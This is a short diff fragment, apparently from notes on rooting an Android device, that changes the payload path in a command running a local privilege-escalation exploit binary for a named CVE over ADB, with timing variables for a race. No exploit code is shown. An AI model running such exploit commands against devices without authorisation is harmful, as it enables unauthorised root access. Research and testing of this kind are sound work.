@@ -91,7 +91,7 @@ The successful ADB entry used the helper loader, not direct `LD_PRELOAD`:
 PSELECT_ROUTE_ATTEMPTS=1
 PSELECT_DELAY_USEC=10000
 /data/local/tmp/cve-2026-43499-root --run-payload \
-  /data/local/tmp/cve-2026-43499-root-original-zhu-v6.so \
+/data/local/tmp/cve-2026-43499 \
   /data/local/tmp/cve-2026-43499-root \
   /data/local/tmp/zhu-v6.log
 ```
